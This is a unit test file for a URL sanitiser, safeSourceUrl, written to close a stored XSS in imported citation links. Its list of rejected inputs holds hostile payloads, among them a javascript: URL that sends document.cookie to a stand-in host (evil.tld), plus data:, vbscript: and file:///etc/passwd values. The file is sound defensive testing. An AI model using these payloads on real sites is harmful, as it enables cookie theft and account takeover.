import { safeSourceUrl } from './url';

describe('safeSourceUrl', () => {
  it.each(['http://example.com/a', 'https://example.com/a?b=c#d'])('keeps %s', (url) => {
    expect(safeSourceUrl(url)).toBe(url);
  });

  /** These are the payloads that made an imported citation stored XSS: the
   * renderers put `link` straight into `href`/`src`, and React 18 emits a
   * `javascript:` URL rather than blocking it. */
  it.each([
    'javascript:fetch("https://evil.tld/?c="+document.cookie)',
    'JavaScript:alert(1)',
    '  javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
  ])('drops %s', (url) => {
    expect(safeSourceUrl(url)).toBeNull();
  });

  it('drops relative and unparseable urls, which no export produces', () => {
    expect(safeSourceUrl('/relative/path')).toBeNull();
    expect(safeSourceUrl('not a url')).toBeNull();
  });

  it('drops empty and absent urls', () => {
    expect(safeSourceUrl('')).toBeNull();
    expect(safeSourceUrl(null)).toBeNull();
    expect(safeSourceUrl(undefined)).toBeNull();
  });
});
